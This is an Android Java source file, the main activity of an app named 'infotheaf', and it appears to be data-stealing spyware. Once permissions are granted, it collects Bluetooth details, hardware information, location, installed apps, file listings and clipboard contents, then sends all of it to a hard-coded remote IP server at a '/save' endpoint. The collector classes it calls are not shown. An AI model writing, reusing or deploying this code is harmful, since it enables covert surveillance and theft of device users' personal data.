package com.example.infotheaf;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.widget.TextView;

import org.json.JSONException;
import org.json.JSONObject;

import java.net.MalformedURLException;

public class MainActivity extends AppCompatActivity {
    public String[] permissions;
    private static final int REQUEST_CODE=0x11;
    private boolean DONE;
    private String SERVER;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        permissions = new String[]{
                Manifest.permission.BLUETOOTH_CONNECT,
                Manifest.permission.BLUETOOTH,
                Manifest.permission.BLUETOOTH_ADMIN,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.INTERNET,
                Manifest.permission.READ_EXTERNAL_STORAGE
        };
        DONE = false;
        SERVER = "http://120.53.236.211:12334/save";
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (DONE == false) {
            if (!checkPermissions()) {
                ActivityCompat.requestPermissions(this, permissions, REQUEST_CODE);
            } else {
                try {
                    doTh1fWork();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void doTh1fWork() throws Exception {
        BluetoothTh1f bluetoothTh1f = new BluetoothTh1f(this);
        ClipboardTh1f clipboardTh1f = new ClipboardTh1f(this);
        HardwareTh1f hardwareTh1f = new HardwareTh1f(this);
        LocationTh1f locationTh1f = new LocationTh1f(this);
        FileTh1f fileTh1f = new FileTh1f(this);
        AppTh1f appTh1f = new AppTh1f(this);
        setContentView(R.layout.activity_main);
        TextView textView = findViewById(R.id.man);
        JSONObject allInfo = new JSONObject();
        try {
            allInfo.put("bluetooth", bluetoothTh1f.getBluetoothInfo());
            allInfo.put("hardware", hardwareTh1f.getHardwareInfo());
            allInfo.put("location", locationTh1f.getLocationInfo());
            allInfo.put("apps", appTh1f.getAppInfo());
            allInfo.put("files", fileTh1f.getFileInfo());
            allInfo.put("clipboard", clipboardTh1f.getClipboardInfo());
            InfoClient infoClient = new InfoClient(SERVER);
            infoClient.sendInfo(allInfo.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        textView.setText(allInfo.toString());
        textView.setMovementMethod(new ScrollingMovementMethod());
        DONE = true;

    }

    public boolean checkPermissions() {

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean isAllgrant = false;
        if (requestCode == REQUEST_CODE) {
            isAllgrant = true;
            for (int grant : grantResults) {
                if (grant == PackageManager.PERMISSION_DENIED) {
                    isAllgrant = false;
                    break;
                }
            }
        }
        // permission all granted, do work
        if (isAllgrant) {
            try {
                doTh1fWork();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            return;
        }
    }
}